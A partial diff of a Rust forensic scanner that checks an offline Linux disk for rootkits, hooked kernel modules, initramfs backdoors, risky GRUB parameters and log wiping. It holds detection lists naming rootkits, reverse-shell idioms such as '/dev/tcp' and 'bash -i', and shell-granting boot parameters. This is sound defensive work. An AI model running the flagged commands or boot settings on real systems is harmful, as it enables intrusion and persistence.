@@ -1,700 +1,660 @@
-use crate::report::{Finding, ScanEvent, Sender, Severity};
-use std::fs;
-use std::os::unix::fs::{MetadataExt, PermissionsExt};
-use std::path::{Path, PathBuf};
-use std::process::Command;
-use std::time::Instant;
+//! Offline forensic scan of a mounted disk. The disk is attacker-controlled input:
+//! every read goes through `Root` (symlinks re-rooted, size caps, regular files only),
+//! and initramfs images are parsed in memory instead of being extracted as root.
+
+use crate::config::ScanConfig;
+use crate::modules::{antiforensics, files, persistence};
+use crate::pkg::{self, Ownership};
+use crate::report::{progress as prog, send, Finding, ScanEvent, Sender, Severity};
+use crate::util::{self, Root};
+use std::os::unix::fs::MetadataExt;
+use std::time::{Duration, Instant};
 
 const MODULE: &str = "OFFLINE";
 
-fn send(tx: &Sender, finding: Finding) {
-    let _ = tx.send(ScanEvent::Finding(finding));
-}
-
 fn progress(tx: &Sender, msg: &str) {
-    let _ = tx.send(ScanEvent::ModuleProgress(MODULE.to_string(), msg.to_string()));
+    prog(tx, MODULE, msg)
 }
 
-fn target(root: &str, path: &str) -> PathBuf {
-    Path::new(root).join(path.trim_start_matches('/'))
+const ROOTKIT_NAMES: [&str; 16] = [
+    "diamorphine",
+    "reptile",
+    "bdvl",
+    "jynx",
+    "suterusu",
+    "knark",
+    "adore",
+    "enyelkm",
+    "azazel",
+    "brootus",
+    "nurupo",
+    "kovid",
+    "beurk",
+    "vlany",
+    "singularity",
+    "khugepagefs",
+];
+
+const HOOK_SIGS: [&[u8]; 14] = [
+    b"sys_call_table",
+    b"kallsyms_lookup_name",
+    b"register_kprobe",
+    b"register_ftrace_function",
+    b"ftrace_set_filter_ip",
+    b"__x64_sys_getdents",
+    b"__x64_sys_kill",
+    b"tcp4_seq_show",
+    b"filldir",
+    b"hide_pid",
+    b"hide_port",
+    b"hidden_pids",
+    b"module_hide",
+    b"rootkit",
+];
+
+pub fn hook_score(data: &[u8]) -> Vec<String> {
+    HOOK_SIGS.iter().filter(|s| data.windows(s.len()).any(|w| w == **s)).map(|s| String::from_utf8_lossy(s).into_owned()).collect()
 }
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  1. KERNEL MODULE SCAN — .ko files on disk
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-fn kernel_module_scan(tx: &Sender, root: &str) {
-    progress(tx, "Scanning kernel modules on disk for rootkit patterns...");
+/// Decompress gzip/zstd/xz/lz4/bzip2 data with a trusted system tool (bounded output).
+pub fn decompress(data: &[u8], cap: usize) -> Option<Vec<u8>> {
+    let (cands, args): (&[&str], &[&str]) = if data.starts_with(&[0x1f, 0x8b]) {
+        (&["/usr/bin/gzip", "/bin/gzip"], &["-dc"])
+    } else if data.starts_with(&[0x28, 0xb5, 0x2f, 0xfd]) {
+        (&["/usr/bin/zstd"], &["-dcq"])
+    } else if data.starts_with(&[0xfd, b'7', b'z', b'X', b'Z', 0]) {
+        (&["/usr/bin/xz", "/bin/xz"], &["-dc"])
+    } else if data.starts_with(&[0x02, 0x21, 0x4c, 0x18]) || data.starts_with(&[0x04, 0x22, 0x4d, 0x18]) {
+        (&["/usr/bin/lz4"], &["-dc"])
+    } else if data.starts_with(b"BZh") {
+        (&["/usr/bin/bzip2", "/bin/bzip2"], &["-dc"])
+    } else if data.starts_with(&[0x5d, 0x00, 0x00]) {
+        (&["/usr/bin/xz", "/bin/xz"], &["--format=lzma", "-dc"])
+    } else {
+        return None;
+    };
+    let out = util::run_cmd(cands, args, Duration::from_secs(120), cap, Some(data.to_vec()))?;
+    if out.stdout.is_empty() {
+        None
+    } else {
+        Some(out.stdout)
+    }
+}
 
-    let modules_dir = target(root, "/lib/modules");
-    if !modules_dir.exists() {
-        send(tx, Finding::new(Severity::Info, MODULE, "Kernel Modules",
-            "No /lib/modules found on target"));
+// ───────────────────────── in-memory cpio (initramfs) ─────────────────────────
+
+#[allow(dead_code)]
+#[derive(Debug)]
+pub struct CpioEntry {
+    pub name: String,
+    pub mode: u32,
+    pub data: Vec<u8>,
+}
+
+fn hex8(b: &[u8]) -> Option<usize> {
+    usize::from_str_radix(std::str::from_utf8(b).ok()?, 16).ok()
+}
+
+/// Parse one newc/crc cpio archive at `off`. Returns entries and the offset after TRAILER.
+pub fn parse_cpio(data: &[u8], mut off: usize, out: &mut Vec<CpioEntry>, file_cap: usize) -> Option<usize> {
+    loop {
+        if off + 110 > data.len() || !(data[off..].starts_with(b"070701") || data[off..].starts_with(b"070702")) {
+            return None;
+        }
+        let h = &data[off..off + 110];
+        let mode = hex8(&h[14..22])? as u32;
+        let filesize = hex8(&h[54..62])?;
+        let namesize = hex8(&h[94..102])?;
+        let name_start = off + 110;
+        let name_end = name_start.checked_add(namesize)?;
+        if name_end > data.len() {
+            return None;
+        }
+        let name = String::from_utf8_lossy(&data[name_start..name_end.saturating_sub(1)]).into_owned();
+        let data_start = (name_end + 3) & !3;
+        let data_end = data_start.checked_add(filesize)?;
+        if data_end > data.len() {
+            return None;
+        }
+        off = (data_end + 3) & !3;
+        if name == "TRAILER!!!" {
+            return Some(off);
+        }
+        let is_reg = mode & 0o170000 == 0o100000;
+        out.push(CpioEntry { name, mode, data: if is_reg && filesize <= file_cap { data[data_start..data_end].to_vec() } else { Vec::new() } });
+    }
+}
+
+/// Parse a whole initramfs: leading uncompressed archives (microcode), then compressed ones.
+pub fn parse_initramfs(data: &[u8], depth: usize, out: &mut Vec<CpioEntry>) {
+    let mut off = 0usize;
+    while off < data.len() {
+        while off < data.len() && data[off] == 0 {
+            off += 1;
+        }
+        if off >= data.len() {
+            break;
+        }
+        if data[off..].starts_with(b"07070") {
+            match parse_cpio(data, off, out, 64 * 1024 * 1024) {
+                Some(next) => off = next,
+                None => break,
+            }
+        } else {
+            if depth < 2 {
+                if let Some(dec) = decompress(&data[off..], 1024 * 1024 * 1024) {
+                    parse_initramfs(&dec, depth + 1, out);
+                }
+            }
+            break;
+        }
+    }
+}
+
+// ───────────────────────── checks ─────────────────────────
+
+fn kernel_module_scan(root: &Root, cfg: &ScanConfig, tx: &Sender) {
+    progress(tx, "Scanning kernel modules on disk (unpackaged modules get a content scan)...");
+    let mut scanned = 0;
+    let mut suspicious = 0;
+    for kver in root.read_dir("/lib/modules") {
+        let base = match root.resolve(&format!("/lib/modules/{}", kver)) {
+            Some(b) => b,
+            None => continue,
+        };
+        util::walk(&base, 12, false, 500_000, |e| {
+            if !e.meta.file_type().is_file() {
+                return;
+            }
+            let host = e.path.to_string_lossy().into_owned();
+            let name = e.path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
+            if !(name.ends_with(".ko") || name.ends_with(".ko.xz") || name.ends_with(".ko.zst") || name.ends_with(".ko.gz")) {
+                return;
+            }
+            scanned += 1;
+            let inner = root.inner(&e.path);
+            let lower = name.to_lowercase();
+            if let Some(rk) = ROOTKIT_NAMES.iter().find(|r| lower.contains(*r)) {
+                suspicious += 1;
+                send(
+                    tx,
+                    Finding::new(Severity::Danger, MODULE, "Rootkit Module", &format!("Known rootkit module '{}' on disk: {}", rk, host))
+                        .subject(&inner)
+                        .artifact(&host),
+                );
+                return;
+            }
+            let owned = pkg::owner(root, &inner);
+            if owned == Ownership::Owned && !cfg.full {
+                return;
+            }
+            let raw = match util::read_capped(&e.path, 256 * 1024 * 1024) {
+                Some(r) => r,
+                None => return,
+            };
+            let data = if name.ends_with(".ko") { raw } else { decompress(&raw, 512 * 1024 * 1024).unwrap_or_default() };
+            let hits = hook_score(&data);
+            if hits.len() >= 3 {
+                suspicious += 1;
+                send(
+                    tx,
+                    Finding::new(
+                        if owned == Ownership::NotOwned { Severity::Danger } else { Severity::Warning },
+                        MODULE,
+                        "Suspicious Module",
+                        &format!("Kernel module with {} hooking indicators: {}", hits.len(), host),
+                    )
+                    .with_detail(&format!("Indicators: {}\nPackage-owned: {:?}", hits.join(", "), owned))
+                    .subject(&inner)
+                    .artifact(&host),
+                );
+            } else if owned == Ownership::NotOwned
+                && (inner.contains("/extra/") || inner.contains("/updates/") || inner.contains("/misc/") || inner.matches('/').count() <= 4)
+            {
+                send(tx, Finding::new(Severity::Info, MODULE, "Kernel Modules", &format!("Unpackaged kernel module (DKMS/manual): {}", inner)).subject(&inner));
+            }
+        });
+    }
+    if suspicious == 0 {
+        send(tx, Finding::new(Severity::Safe, MODULE, "Kernel Modules", &format!("{} kernel modules checked — no rootkit indicators", scanned)).subject("ko"));
+    }
+}
+
+fn initramfs_scan(root: &Root, tx: &Sender) {
+    progress(tx, "Parsing initramfs images in memory (no extraction to disk)...");
+    let images: Vec<String> = root.read_dir("/boot").into_iter().filter(|n| n.starts_with("initrd") || n.starts_with("initramfs")).collect();
+    if images.is_empty() {
+        send(tx, Finding::new(Severity::Info, MODULE, "Initramfs", "No initramfs/initrd found in /boot").subject("initrd-none"));
         return;
     }
-
-    let rootkit_ko_names = [
-        "diamorphine", "reptile", "bdvl", "jynx", "suterusu", "knark",
-        "adore", "enyelkm", "azazel", "brootus", "nurupo", "kovid",
-        "beurk", "vlany", "libprocesshider", "khugepagefs",
-    ];
-
-    // Hooking signatures found in rootkit kernel modules
-    let hook_signatures: &[&[u8]] = &[
-        b"sys_call_table",
-        b"kallsyms_lookup_name",
-        b"register_kretprobe",
-        b"__x64_sys_getdents",
-        b"__x64_sys_kill",
-        b"tcp4_seq_show",
-        b"filldir",
-        b"orig_",
-        b"hook_",
-        b"rootkit",
-        b"hide_pid",
-        b"hide_port",
-        b"invisible",
-    ];
-
-    let mut suspicious_modules = Vec::new();
-    let mut total_scanned = 0u32;
-
-    // Walk all .ko and .ko.xz/.ko.zst files
-    if let Ok(output) = Command::new("find")
-        .args([modules_dir.to_str().unwrap_or(""), "-name", "*.ko", "-o", "-name", "*.ko.xz", "-o", "-name", "*.ko.zst"])
-        .output()
-    {
-        let stdout = String::from_utf8_lossy(&output.stdout);
-        for line in stdout.lines() {
-            let path = line.trim();
-            if path.is_empty() { continue; }
-            total_scanned += 1;
-
-            let filename = Path::new(path).file_stem()
-                .and_then(|s| s.to_str())
-                .unwrap_or("")
-                .to_lowercase();
-
-            // Check known rootkit names
-            for rk in &rootkit_ko_names {
-                if filename.contains(rk) {
-                    send(tx, Finding::new(Severity::Danger, MODULE, "Rootkit Module",
-                        &format!("Known rootkit kernel module on disk: {}", path)));
-                    suspicious_modules.push(path.to_string());
-                }
+    for img in &images {
+        let path = format!("/boot/{}", img);
+        let data = match root.read_capped(&path, 512 * 1024 * 1024) {
+            Some(d) => d,
+            None => continue,
+        };
+        let mut entries = Vec::new();
+        parse_initramfs(&data, 0, &mut entries);
+        let mut hits = 0;
+        for e in &entries {
+            let file = e.name.rsplit('/').next().unwrap_or(&e.name).to_lowercase();
+            if let Some(rk) = ROOTKIT_NAMES.iter().find(|r| file.contains(*r)) {
+                hits += 1;
+                send(
+                    tx,
+                    Finding::new(Severity::Danger, MODULE, "Initramfs Rootkit", &format!("'{}' embedded in {}: {}", rk, path, e.name))
+                        .subject(&format!("{}:{}", path, e.name)),
+                );
+                continue;
             }
-
-            // For uncompressed .ko files, scan binary content for hook patterns
-            if path.ends_with(".ko") {
-                if let Ok(data) = fs::read(path) {
-                    let mut hook_count = 0;
-                    for sig in hook_signatures {
-                        if data.windows(sig.len()).any(|w| w == *sig) {
-                            hook_count += 1;
-                        }
-                    }
-                    // 3+ hooking patterns in one module = suspicious
-                    if hook_count >= 3 {
-                        if !suspicious_modules.contains(&path.to_string()) {
-                            send(tx, Finding::new(Severity::Warning, MODULE, "Suspicious Module",
-                                &format!("Kernel module has {} hooking patterns: {}", hook_count, path))
-                                .with_detail("Contains sys_call_table/hook/hide references — possible rootkit"));
-                            suspicious_modules.push(path.to_string());
-                        }
-                    }
-                }
+            if e.data.is_empty() {
+                continue;
             }
-        }
-    }
-
-    if suspicious_modules.is_empty() {
-        send(tx, Finding::new(Severity::Safe, MODULE, "Kernel Modules",
-            &format!("{} kernel modules scanned — no rootkit signatures found", total_scanned)));
-    }
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  2. BINARY INTEGRITY — dpkg on target's own DB
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-fn binary_integrity(tx: &Sender, root: &str) {
-    progress(tx, "Verifying binary integrity using target's package database...");
-
-    // Use dpkg with --root to query target disk's own package DB
-    let mut child = match Command::new("dpkg")
-        .args(["--root", root, "--verify"])
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn() {
-        Ok(c) => c,
-        Err(_) => {
-            send(tx, Finding::new(Severity::Info, MODULE, "Pkg Integrity",
-                "dpkg not available — skipping package integrity check"));
-            return;
-        }
-    };
-
-    let timeout = std::time::Duration::from_secs(60);
-    let start_time = std::time::Instant::now();
-    loop {
-        match child.try_wait() {
-            Ok(Some(_)) => break,
-            Ok(None) => {
-                if start_time.elapsed() > timeout {
-                    let _ = child.kill();
-                    let _ = child.wait();
-                    send(tx, Finding::new(Severity::Info, MODULE, "Pkg Integrity",
-                        "dpkg --verify timed out (>60s) — large system, skipping"));
-                    return;
+            if file.ends_with(".ko") || file.ends_with(".ko.zst") || file.ends_with(".ko.xz") {
+                let data = if file.ends_with(".ko") { e.data.clone() } else { decompress(&e.data, 256 * 1024 * 1024).unwrap_or_default() };
+                let h = hook_score(&data);
+                if h.len() >= 3 {
+                    hits += 1;
+                    send(
+                        tx,
+                        Finding::new(
+                            Severity::Warning,
+                            MODULE,
+                            "Initramfs Hook",
+                            &format!("Module in {} has {} hooking indicators: {}", path, h.len(), e.name),
+                        )
+                        .with_detail(&h.join(", "))
+                        .subject(&format!("{}:{}", path, e.name)),
+                    );
                 }
-                std::thread::sleep(std::time::Duration::from_millis(100));
-            }
-            Err(_) => return,
-        }
-    }
-
-    let output = match child.wait_with_output() {
-        Ok(o) => o,
-        Err(_) => return,
-    };
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
-    let stderr = String::from_utf8_lossy(&output.stderr);
-    let combined = format!("{}{}", stdout, stderr);
-
-    let mut tampered = Vec::new();
-    for line in combined.lines() {
-        let trimmed = line.trim();
-        if trimmed.is_empty() { continue; }
-        // "5" = MD5 checksum mismatch
-        if trimmed.contains("5") && trimmed.len() > 10 {
-            let parts: Vec<&str> = trimmed.splitn(2, ' ').collect();
-            if parts.len() == 2 {
-                let file_path = parts[1].trim();
-                if file_path.starts_with("/etc/") { continue; }
-                if file_path.starts_with("/usr/bin/") || file_path.starts_with("/usr/sbin/")
-                    || file_path.starts_with("/bin/") || file_path.starts_with("/sbin/")
-                    || file_path.contains(".so") {
-                    tampered.push(file_path.to_string());
-                }
-            }
-        }
-    }
-
-    if tampered.is_empty() {
-        send(tx, Finding::new(Severity::Safe, MODULE, "Binary Integrity",
-            "All system binaries match package checksums on target disk"));
-    } else {
-        for path in &tampered {
-            send(tx, Finding::new(Severity::Danger, MODULE, "Tampered Binary",
-                &format!("Binary doesn't match package checksum: {}", path))
-                .with_detail("Offline verification — rootkit cannot hide this"));
-        }
-    }
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  3. PERSISTENCE SCAN — cron, PAM, systemd, rc
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-fn persistence_scan(tx: &Sender, root: &str) {
-    progress(tx, "Scanning persistence mechanisms on target disk...");
-
-    // ld.so.preload
-    let preload = target(root, "/etc/ld.so.preload");
-    if let Ok(content) = fs::read_to_string(&preload) {
-        let trimmed = content.trim();
-        if !trimmed.is_empty() {
-            send(tx, Finding::new(Severity::Danger, MODULE, "LD Preload",
-                "ld.so.preload has entries on target disk — global library injection")
-                .with_detail(&format!("Content: {}", trimmed)));
-        }
-    }
-
-    // Cron dirs
-    let cron_dirs = ["etc/cron.d", "etc/cron.daily", "etc/cron.hourly",
-        "etc/cron.weekly", "etc/cron.monthly", "var/spool/cron/crontabs"];
-    let bad_patterns = [" curl ", " wget ", " ncat ", "/dev/tcp",
-        "python -c", "python3 -c", "bash -i", "chmod 777", "/dev/shm/"];
-
-    for dir in &cron_dirs {
-        let cron_path = target(root, dir);
-        if let Ok(entries) = fs::read_dir(&cron_path) {
-            for entry in entries.flatten() {
-                if let Ok(content) = fs::read_to_string(entry.path()) {
-                    for (i, line) in content.lines().enumerate() {
-                        let lower = line.to_lowercase();
-                        if line.starts_with('#') { continue; }
-                        for pat in &bad_patterns {
-                            if lower.contains(pat) {
-                                send(tx, Finding::new(Severity::Warning, MODULE, "Cron Persistence",
-                                    &format!("Suspicious cron entry in {}/{}: line {}",
-                                        dir, entry.file_name().to_string_lossy(), i + 1))
-                                    .with_detail(line.trim()));
-                                break;
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    // Suspicious systemd services
-    // Suspicious systemd services — only check user-created ones in etc/systemd/system
-    let sd_path = target(root, "etc/systemd/system");
-    if let Ok(entries) = fs::read_dir(&sd_path) {
-        for entry in entries.flatten() {
-            let name = entry.file_name().to_string_lossy().to_string();
-            if !name.ends_with(".service") { continue; }
-            // Skip symlinks (enabled services) — only check actual unit files
-            if entry.path().is_symlink() { continue; }
-            if let Ok(content) = fs::read_to_string(entry.path()) {
-                let lower = content.to_lowercase();
-                let service_bad = ["/dev/tcp", "bash -i", "python -c", "python3 -c",
-                    " ncat ", "chmod 777", "/dev/shm/"];
-                for pat in &service_bad {
-                    if lower.contains(pat) {
-                        send(tx, Finding::new(Severity::Warning, MODULE, "Systemd Persistence",
-                            &format!("Suspicious user systemd service: {}", name))
-                            .with_detail(&format!("Contains: {}", pat)));
+            } else if e.data.starts_with(b"#!") || file.ends_with(".sh") || e.name == "init" {
+                let text = String::from_utf8_lossy(&e.data);
+                for line in text.lines() {
+                    if persistence::danger_set().is_match(line) {
+                        hits += 1;
+                        send(
+                            tx,
+                            Finding::new(
+                                Severity::Danger,
+                                MODULE,
+                                "Initramfs Script",
+                                &format!("Backdoor-like command in initramfs script {} ({})", e.name, path),
+                            )
+                            .with_detail(&util::truncate(line.trim(), 300))
+                            .subject(&format!("{}:{}", path, e.name)),
+                        );
                         break;
                     }
                 }
             }
+            // early userspace preload: /etc/ld.so.preload inside the initramfs
+            if e.name.ends_with("etc/ld.so.preload") && !e.data.iter().all(|b| b.is_ascii_whitespace()) {
+                hits += 1;
+                send(
+                    tx,
+                    Finding::new(Severity::Danger, MODULE, "Initramfs Rootkit", &format!("{} contains etc/ld.so.preload", path))
+                        .with_detail(&String::from_utf8_lossy(&e.data))
+                        .subject(&format!("{}:preload", path)),
+                );
+            }
         }
+        send(
+            tx,
+            Finding::new(
+                if entries.is_empty() { Severity::Warning } else { Severity::Info },
+                MODULE,
+                "Initramfs",
+                &format!("{}: {} entries parsed, {} indicator(s)", path, entries.len(), hits),
+            )
+            .with_detail(if entries.is_empty() { "Could not parse — unknown compression or decompressor missing" } else { "" })
+            .subject(&format!("initrd:{}", path)),
+        );
     }
+}
 
-    // PAM backdoor check
-    // Skip standard GDM configs — gdm-autologin and gdm-launch-environment
-    // legitimately use pam_permit.so for display manager login
-    let pam_dir = target(root, "/etc/pam.d");
-    if pam_dir.exists() {
-        let gdm_safe = ["gdm-autologin", "gdm-launch-environment", "gdm-fingerprint",
-            "gdm-smartcard", "lightdm-autologin", "sddm-autologin"];
-        if let Ok(entries) = fs::read_dir(&pam_dir) {
-            for entry in entries.flatten() {
-                let fname = entry.file_name().to_string_lossy().to_string();
-                if gdm_safe.iter().any(|g| fname == *g) { continue; }
-                if let Ok(content) = fs::read_to_string(entry.path()) {
-                    let has_deny = content.lines().any(|l| l.contains("pam_deny.so"));
-                    let has_unix = content.lines().any(|l| l.contains("pam_unix.so"));
-                    for line in content.lines() {
-                        let trimmed = line.trim();
-                        if trimmed.starts_with('#') { continue; }
-                        if trimmed.contains("pam_permit.so") {
-                            if trimmed.contains("sufficient") || (!has_deny && !has_unix) {
-                                send(tx, Finding::new(Severity::Danger, MODULE, "PAM Backdoor",
-                                    &format!("PAM backdoor in {}: pam_permit.so allows any login", fname))
-                                    .with_detail(trimmed));
-                            }
-                        }
+fn bootloader_scan(root: &Root, tx: &Sender) {
+    progress(tx, "Checking bootloader configuration and binaries...");
+    let cfgs = ["/boot/grub/grub.cfg", "/boot/grub2/grub.cfg", "/boot/efi/EFI/fedora/grub.cfg", "/etc/default/grub"];
+    let bad_params = [
+        "init=/bin/sh",
+        "init=/bin/bash",
+        "rdinit=/bin/sh",
+        "rd.break",
+        "systemd.debug-shell",
+        "debug_shell",
+        "lockdown=none",
+        "module.sig_enforce=0",
+        "selinux=0",
+        "apparmor=0",
+    ];
+    let known_mods = [
+        "ext2",
+        "ext4",
+        "xfs",
+        "btrfs",
+        "fat",
+        "ntfs",
+        "part_gpt",
+        "part_msdos",
+        "normal",
+        "linux",
+        "loopback",
+        "gzio",
+        "lvm",
+        "raid",
+        "search",
+        "configfile",
+        "terminal",
+        "serial",
+        "video",
+        "gfxterm",
+        "gfxmenu",
+        "png",
+        "jpeg",
+        "font",
+        "echo",
+        "ls",
+        "cat",
+        "test",
+        "true",
+        "sleep",
+        "reboot",
+        "halt",
+        "iso9660",
+        "udf",
+        "all_video",
+        "boot",
+        "chain",
+        "cryptodisk",
+        "luks",
+        "luks2",
+        "gcry_rijndael",
+        "gcry_sha256",
+        "gcry_sha512",
+        "mdraid09",
+        "mdraid1x",
+        "diskfilter",
+        "loadenv",
+        "keystatus",
+        "regexp",
+        "probe",
+        "password_pbkdf2",
+        "lzopio",
+        "search_fs_uuid",
+        "search_fs_file",
+        "search_label",
+        "biosdisk",
+        "multiboot",
+        "multiboot2",
+        "play",
+        "trig",
+        "lspci",
+        "usb",
+        "uhci",
+        "ohci",
+        "ehci",
+        "usbms",
+        "xhci",
+        "efi_gop",
+        "efi_uga",
+        "gfxterm_background",
+        "tpm",
+        "zfs",
+        "zstd",
+        "blscfg",
+        "increment",
+        "bli",
+        "f2fs",
+        "squash4",
+        "exfat",
+        "hfsplus",
+        "minicmd",
+        "vbe",
+        "vga",
+        "video_bochs",
+        "video_cirrus",
+    ];
+    for c in cfgs {
+        let content = match root.read_string(c, 16 * 1024 * 1024) {
+            Some(x) => x,
+            None => continue,
+        };
+        for line in content.lines() {
+            let t = line.trim();
+            if t.starts_with('#') {
+                continue;
+            }
+            let is_kernel_line = t.starts_with("linux") || t.starts_with("kernel") || t.starts_with("GRUB_CMDLINE_LINUX");
+            if is_kernel_line {
+                let tokens: Vec<&str> = t.split(|ch: char| ch.is_whitespace() || ch == '"').collect();
+                for p in &bad_params {
+                    if tokens.contains(p) {
+                        send(
+                            tx,
+                            Finding::new(Severity::Warning, MODULE, "GRUB Config", &format!("Boot parameter '{}' in {}", p, root.display(c)))
+                                .with_detail(&format!("{}\nGives a root shell at boot or disables kernel protections", util::truncate(t, 200)))
+                                .subject(&format!("{}:{}", c, p)),
+                        );
                     }
                 }
             }
-        }
-    }
-
-    // SSH authorized_keys across all users
-    let home_base = target(root, "/home");
-    let mut homes: Vec<PathBuf> = Vec::new();
-    homes.push(target(root, "/root"));
-    if let Ok(entries) = fs::read_dir(&home_base) {
-        for entry in entries.flatten() {
-            if entry.path().is_dir() {
-                homes.push(entry.path());
-            }
-        }
-    }
-
-    for home in &homes {
-        let ak_path = home.join(".ssh/authorized_keys");
-        if let Ok(content) = fs::read_to_string(&ak_path) {
-            for line in content.lines() {
-                let trimmed = line.trim();
-                if trimmed.is_empty() || trimmed.starts_with('#') { continue; }
-                if trimmed.contains("command=") || trimmed.contains("tunnel") {
-                    send(tx, Finding::new(Severity::Warning, MODULE, "SSH Key",
-                        &format!("Forced command SSH key in {}", ak_path.display()))
-                        .with_detail(trimmed));
+            if let Some(rest) = t.strip_prefix("insmod ") {
+                let m = rest.trim();
+                if !known_mods.contains(&m) {
+                    send(
+                        tx,
+                        Finding::new(Severity::Warning, MODULE, "GRUB Module", &format!("Unusual GRUB module '{}' loaded in {}", m, root.display(c)))
+                            .subject(&format!("{}:{}", c, m)),
+                    );
                 }
             }
         }
-
-        // Shell history → /dev/null symlink
-        for hist in &[".bash_history", ".zsh_history"] {
-            let hist_path = home.join(hist);
-            if hist_path.is_symlink() {
-                if let Ok(link_target) = fs::read_link(&hist_path) {
-                    if link_target.to_string_lossy().contains("/dev/null") {
-                        send(tx, Finding::new(Severity::Warning, MODULE, "History Wiped",
-                            &format!("{} is symlink to /dev/null", hist_path.display())));
-                    }
+    }
+    for dir in ["/boot/grub", "/boot/grub2", "/boot/efi/EFI"] {
+        if let Some(base) = root.resolve(dir) {
+            util::walk(&base, 4, false, 50_000, |e| {
+                let n = e.path.to_string_lossy();
+                let boot_file = n.ends_with(".efi") || n.ends_with(".img") || n.ends_with(".mod");
+                // FAT EFI partitions have no real permissions — only judge /boot/grub*
+                if e.meta.file_type().is_file() && boot_file && e.meta.mode() & 0o022 != 0 && !n.contains("/boot/efi") {
+                    send(tx, Finding::new(Severity::Danger, MODULE, "Bootloader", &format!("Bootloader file is group/world writable: {}", n)).subject(&n));
                 }
-            }
+            });
         }
     }
 }
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  4. INITRAMFS SCAN — unpack and check
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-fn initramfs_scan(tx: &Sender, root: &str) {
-    progress(tx, "Scanning initramfs for backdoors...");
-
-    let boot_dir = target(root, "/boot");
-    if !boot_dir.exists() {
-        send(tx, Finding::new(Severity::Info, MODULE, "Initramfs",
-            "No /boot found on target"));
-        return;
-    }
-
-    // Find initramfs/initrd files
-    let mut initrd_files = Vec::new();
-    if let Ok(entries) = fs::read_dir(&boot_dir) {
-        for entry in entries.flatten() {
-            let name = entry.file_name().to_string_lossy().to_string();
-            if name.starts_with("initrd") || name.starts_with("initramfs") {
-                initrd_files.push(entry.path());
+fn hidden_files_scan(root: &Root, tx: &Sender) {
+    progress(tx, "Scanning temp/home dirs on disk for binaries and SUID files...");
+    for dir in ["/tmp", "/var/tmp", "/dev/shm", "/run", "/home", "/root", "/var/www", "/opt"] {
+        let base = match root.resolve(dir) {
+            Some(b) => b,
+            None => continue,
+        };
+        let temp = matches!(dir, "/tmp" | "/var/tmp" | "/dev/shm" | "/run");
+        util::walk(&base, 6, false, 1_000_000, |e| {
+            if !e.meta.file_type().is_file() {
+                return;
             }
-        }
-    }
-
-    if initrd_files.is_empty() {
-        send(tx, Finding::new(Severity::Info, MODULE, "Initramfs",
-            "No initramfs/initrd found in /boot"));
-        return;
-    }
-
-    for initrd in &initrd_files {
-        let tmp_dir = format!("/tmp/narayanastra_initrd_{}", std::process::id());
-        let _ = fs::create_dir_all(&tmp_dir);
-
-        // Try unmkinitramfs first (Debian/Ubuntu), fall back to cpio
-        let extracted = Command::new("unmkinitramfs")
-            .args([initrd.to_str().unwrap_or(""), &tmp_dir])
-            .output()
-            .map(|o| o.status.success())
-            .unwrap_or(false);
-
-        if !extracted {
-            // Try lsinitrd for listing only (RHEL/Fedora)
-            if let Ok(output) = Command::new("lsinitrd").arg(initrd).output() {
-                let stdout = String::from_utf8_lossy(&output.stdout).to_lowercase();
-                for rk in &["diamorphine", "reptile", "bdvl", "rootkit", "backdoor"] {
-                    if stdout.contains(rk) {
-                        send(tx, Finding::new(Severity::Danger, MODULE, "Initramfs Rootkit",
-                            &format!("Rootkit reference '{}' in {}", rk, initrd.display())));
+            let inner = root.inner(&e.path);
+            let host = e.path.to_string_lossy().into_owned();
+            let mode = e.meta.mode();
+            if mode & 0o4000 != 0 && e.meta.uid() == 0 {
+                send(
+                    tx,
+                    Finding::new(Severity::Danger, MODULE, "Hidden SUID", &format!("Root SUID binary outside system paths: {}", inner))
+                        .with_detail("Privilege-escalation backdoor")
+                        .subject(&inner)
+                        .artifact(&host),
+                );
+                return;
+            }
+            let hidden = util::has_hidden_component(&inner);
+            if temp || (hidden && !inner.starts_with("/home/") && !inner.starts_with("/root/")) {
+                if let Some(head) = util::read_head(&e.path, 4) {
+                    if util::is_elf(&head) || util::is_pe(&head) {
+                        send(
+                            tx,
+                            Finding::new(Severity::Danger, MODULE, "Hidden Binary", &format!("Executable in {}: {}", dir, inner))
+                                .with_detail(&format!("Size {} bytes — visible offline even if a rootkit hid it live", e.meta.len()))
+                                .subject(&inner)
+                                .artifact(&host),
+                        );
                     }
                 }
             }
-            let _ = fs::remove_dir_all(&tmp_dir);
+        });
+    }
+}
+
+fn log_evidence_scan(root: &Root, tx: &Sender) {
+    progress(tx, "Checking logs on disk for wiping...");
+    let mut ok_uids = util::uids_of(root, &["root", "syslog", "_apt", "systemd-journal"]);
+    ok_uids.push(0);
+    let ok_gids = util::gids_of(root, &["adm", "systemd-journal", "utmp", "syslog", "root"]);
+    for log in [
+        "/var/log/auth.log",
+        "/var/log/syslog",
+        "/var/log/kern.log",
+        "/var/log/messages",
+        "/var/log/secure",
+        "/var/log/audit/audit.log",
+        "/var/log/wtmp",
+        "/var/log/lastlog",
+    ] {
+        let meta = match root.lstat(log) {
+            Some(m) => m,
+            None => continue,
+        };
+        if meta.file_type().is_symlink() {
+            send(
+                tx,
+                Finding::new(Severity::Danger, MODULE, "Log Wiped", &format!("{} is a symlink to {}", log, root.readlink(log).unwrap_or_default()))
+                    .subject(&format!("link:{}", log)),
+            );
             continue;
         }
-
-        // Scan extracted contents
-        if let Ok(output) = Command::new("find")
-            .args([&tmp_dir, "-type", "f"])
-            .output()
-        {
-            let stdout = String::from_utf8_lossy(&output.stdout);
-            for line in stdout.lines() {
